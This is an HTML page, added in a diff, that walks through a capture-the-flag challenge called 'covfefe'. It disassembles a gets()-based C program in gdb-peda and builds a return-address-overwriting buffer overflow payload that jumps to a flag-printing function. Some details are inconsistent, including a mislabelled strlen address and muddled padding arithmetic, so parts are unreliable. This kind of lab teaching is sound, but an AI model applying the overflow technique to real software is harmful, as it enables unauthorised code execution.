@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>HTML5, CSS3 and JavaScript demo</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <h1 style="text-align:center">CTF2</h1>
+  <h2 class="qsn">1. covfefe</h2>
+  <h5 class="binary">binary can be found <a href="">here</a></h5>
+  <h4>The 'C' code is:</h4>
+  
+<pre class="code">void capture_me()
+{
+	system("/bin/cat flag");
+}
+
+int main()
+{
+	char s1[50];
+	char s2[50];
+	printf("Enter your first string:");
+	gets(s1);
+	printf("Enter your second string:");
+	gets(s2);
+	
+	char len1 = strlen(s1);
+	char len2 = strlen(s2);
+
+	if(len1 + len2 > 100){
+		exit(0);
+	}
+
+	printf("I forgot the flag :p\n");
+	return 0;
+}</pre>
+  <p>When we open the binary file(executable) with gdb (install gdb-peda if don't have, using commands:
+    <pre style="background-color:#C8C8C8")>git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit</pre> and dissassemble the main function:</p>
+  <pre class="code">
+<span style="color:red;">gdb-peda</span>$ disassemble main
+Dump of assembler code for function main:
+   0x0000000000400672 <+0>:	push   rbp
+   0x0000000000400673 <+1>:	mov    rbp,rsp
+   0x0000000000400676 <+4>:	add    rsp,0xffffffffffffff80
+   0x000000000040067a <+8>:	mov    edi,0x400792
+   0x000000000040067f <+13>:	mov    eax,0x0
+   0x0000000000400684 <+18>:	call   0x400520 <printf@p></printf@p>
+   0x0000000000400689 <+23>:	lea    rax,[rbp-0x40]
+   0x000000000040068d <+27>:	mov    rdi,rax
+   0x0000000000400690 <+30>:	call   0x400550 <gets@plt>
+   0x0000000000400695 <+35>:	mov    edi,0x4007ab
+   0x000000000040069a <+40>:	mov    eax,0x0
+   0x000000000040069f <+45>:	call   0x400520 <printf@plt>
+   0x00000000004006a4 <+50>:	lea    rax,[rbp-0x80]
+   0x00000000004006a8 <+54>:	mov    rdi,rax
+   0x00000000004006ab <+57>:	call   0x400550 <gets@plt>
+   0x00000000004006b0 <+62>:	lea    rax,[rbp-0x40]
+   0x00000000004006b4 <+66>:	mov    rdi,rax
+   0x00000000004006b7 <+69>:	call   0x400500 <strlen@plt>
+   0x00000000004006bc <+74>:	mov    BYTE PTR [rbp-0x1],al
+   0x00000000004006bf <+77>:	lea    rax,[rbp-0x80]
+   0x00000000004006c3 <+81>:	mov    rdi,rax
+   0x00000000004006c6 <+84>:	call   0x400500 <strlen@plt>
+   0x00000000004006cb <+89>:	mov    BYTE PTR [rbp-0x2],al
+   0x00000000004006ce <+92>:	movsx  edx,BYTE PTR [rbp-0x1]
+   0x00000000004006d2 <+96>:	movsx  eax,BYTE PTR [rbp-0x2]
+   0x00000000004006d6 <+100>:	add    eax,edx
+   0x00000000004006d8 <+102>:	cmp    eax,0x64
+   0x00000000004006db <+105>:	jle    0x4006e7 <main+117>
+   0x00000000004006dd <+107>:	mov    edi,0x0
+   0x00000000004006e2 <+112>:	call   0x400560 <exit@plt>
+   0x00000000004006e7 <+117>:	mov    edi,0x4007c5
+   0x00000000004006ec <+122>:	call   0x4004f0 <puts@plt>
+   0x00000000004006f1 <+127>:	mov    eax,0x0
+   0x00000000004006f6 <+132>:	leave  
+   0x00000000004006f7 <+133>:	ret    
+End of assembler dump. </pre>
+  <h4>Let's learn how to read assembly code:</h4>
+<hr/>
+<p>
+
+1.The first three lines of code
+<pre class="code">   0x0000000000400672 <+0>:	push   rbp
+   0x0000000000400673 <+1>:	mov    rbp,rsp
+   0x0000000000400676 <+4>:	add    rsp,0xffffffffffffff80</pre>
+
+	are the procedure prelude,present in the beggining of every code.  It first saves the old frame pointer,
+	makes the current stack pointer the new frame pointer.And leaves space for local variables,in this case '128' bytes.<br/>
+0xffffffffffffff80 = -128 in hex.
+<br/><br/>
+2.
+<pre class="code">   0x000000000040067a <+8>:	mov    edi,0x400792
+   0x000000000040067f <+13>:	mov    eax,0x0
+   0x0000000000400684 <+18>:	call   0x400520
+</pre>
+0x400792 is the address of string "Enter your first string:".
+<pre class="code">gdb-peda$ x/s 0x400792
+0x400792:	"Enter your first string:"</pre>
+0x400520 is the address of printf function (you can check by command "<b>x/s 0x400520</b>" in gdb). So it calls the printf function which prints the string present in 'edi' register.
+<br/><br/>
+3.
+<pre class="code">   0x0000000000400689 <+23>:	lea    rax,[rbp-0x40]
+   0x000000000040068d <+27>:	mov    rdi,rax
+   0x0000000000400690 <+30>:	call   0x400550</pre>
+It loads the address of [rbp-0x40] ( i.e if 'rbp' is at 0x7fffffffe5c0 ,then it loads the address by subtracting 64 bytes from it. Thus it copies the address 0x7fffffffe580 in rax) in rax register.<br/>
+0x400550 is the address of 'gets' function.
+<pre class="code">gdb-peda$ x/s 0x400550
+0x400550 gets@plt:  "\377%\022\006 "</pre>
+So 'gets' function is called which asks for an input and writes in the stack without actually taking care of size of input.This means our input is stored at the address [rbp-0x40]. So it may allow to overwrite stack(i.e stack or buffer overflow).<br/><br/>
+4.
+<pre class="code">   0x0000000000400689 <+23>:	lea    rax,[rbp-0x40]
+   0x000000000040068d <+27>:	mov    rdi,rax
+   0x0000000000400690 <+30>:	call   0x400550 
+   0x0000000000400695 <+35>:	mov    edi,0x4007ab
+   0x000000000040069a <+40>:	mov    eax,0x0
+   0x000000000040069f <+45>:	call   0x400520 </pre>
+Ths is same as first part. Prints a string "Enter your second string:". And then asks for an input and writes at the address [rbp-0x80].
+<br/><br/>
+4.
+<pre class="code">   0x00000000004006a4 <+50>:	lea    rax,[rbp-0x80]
+   0x00000000004006a8 <+54>:	mov    rdi,rax
+   0x00000000004006ab <+57>:	call   0x400550
+   0x00000000004006bc <+74>:	mov    BYTE PTR [rbp-0x1],al</pre>
+0x400550 is the address of <b>'strlen'</b> function.And [rbp-0x80] has our second string.So it stores the length of second string in eax register and then copies the value of last byte (because length is defined as 'char len2' in our 'c' code ,so it is stored in one byte.) in [rbp-0x1].
+<br/><br/>
+5.
+<pre class="code">   0x00000000004006bf <+77>:	lea    rax,[rbp-0x80]
+   0x00000000004006c3 <+81>:	mov    rdi,rax
+   0x00000000004006c6 <+84>:	call   0x400500 
+   0x00000000004006cb <+89>:	mov    BYTE PTR [rbp-0x2],al</pre>
+Same as above,copies the length of first string in [rbp-0x2].<br/><br/>
+6.
+<pre class="code">   0x00000000004006ce <+92>:	movsx  edx,BYTE PTR [rbp-0x1]
+   0x00000000004006d2 <+96>:	movsx  eax,BYTE PTR [rbp-0x2]
+   0x00000000004006d6 <+100>:	add    eax,edx
+   0x00000000004006d8 <+102>:	cmp    eax,0x64
+   0x00000000004006db <+105>:	jle    0x4006e7 
+   0x00000000004006dd <+107>:	mov    edi,0x0
+   0x00000000004006e2 <+112>:	call   0x400560 
+   0x00000000004006e7 <+117>:	mov    edi,0x4007c5
+   0x00000000004006ec <+122>:	call   0x4004f0 
+   0x00000000004006f1 <+127>:	mov    eax,0x0
+   0x00000000004006f6 <+132>:	leave  
+   0x00000000004006f7 <+133>:	ret </pre>
+Copies the length of second and first string in edx and eax register respectively.Then add the lengths and store the result in 'eax' register.Then it compares the value in eax register with 100,if eax is less-then-or-equal to 100,then it makes a jump at 0x4006e7 i.e at main+117 whose address is same as 0x4006e7.And if not,it continues without making any jump.If it continues,the program will be stopped by calling <b>exit</b> function at main+112 i.e 0x4007c5 is the address of 'exit' function.
+<br/>
+And if it jumps at main+117 ,then it will print <i>"I forgot the flag :p\n"</i> and returns at the address stored in return.
+</p>
+<hr/>
+
+<h4>Overwriting the return address</h4>
+<p>
+For that we first need to study the structure of stack.
+Stack follows <b>LIFO(Last Input First Output)</b>.
+</p>
+<pre>[---string2---][     ][---string1---][   ][ l1 ][ l2 ][--rbp--][-return-]
+  52bytes       12byte  52bytes      10byte 1byt 1byt  8byte    8byte
+</pre>
+<p>This is how the stack looks like.Strings have size of 52byte and not 50bytes because the size is always allocated in multiples of four.The rbp and return have size 8bytes because it is a 64 bit executable program.In 32bit ,the latter have 4byte size. 
+<br/><br/>
+Now,when the program is executed,it asks for an input to be stored in <b>'string 1'</b>,with no input size restriction.To overwrite the written address,we need to give an input of 72 bytes:<br/>50+10+1+1+8 = 72 bytes<br/>And in the last,a 8 byte address that we want to write in place of return.We want the <b>"capture_me"</b> function to execute.So we will write the address of <b>"capture_me"</b> in return,so that ,when the programme returns,that function is executed.
+<br>To get <b>"capture_me"</b> address,we dissassemble the function:
+</p>
+<pre class="code"><span style="color:red">gdb-peda</span>$ disas capture_me 
+Dump of assembler code for function capture_me:
+   0x000000000040065d <+0>:	push   rbp
+   0x000000000040065e <+1>:	mov    rbp,rsp
+   0x0000000000400661 <+4>:	mov    edi,0x400784
+   0x0000000000400666 <+9>:	mov    eax,0x0
+   0x000000000040066b <+14>:	call   0x400510 <system@plt>
+   0x0000000000400670 <+19>:	pop    rbp
+   0x0000000000400671 <+20>:	ret    
+End of assembler dump.</pre>
+<p><i>0x000000000040065d</i> is the required address.So we will should give an input in the first string like below,but that will <strong>not</strong> work:
+<pre class="code">aaaaaaa......aaaa(72times)0x000000000040065d</pre>
+Actually ,in return,the first byte should contain <b>0x5d</b> and 2nd byte should contain <b>0x06</b> and so on.So,a way to give the input is using python:<br/>
+In a different file,may br <i>/tmp</i> directory,we will write a python code.
+<pre class="code">$ vim /tmp/amit
+</pre>
+And write:
+<pre class="code">python -c "print 'a'*72+'\x5d\x06\x40\x00\x00\x00\x00\x00'"</pre>
+Then store the output of this code in a different file by:
+<pre class="code">$ /tmp/amit >> /tmp/input</pre>
+Now run the program and input this file as:
+<pre class="code">$ ./covfefe << /tmp/input </pre>
+And we get the flag! 
+
+</p>
+<!--liveweave.com/pFIDqm-->
+</body>
+</html>
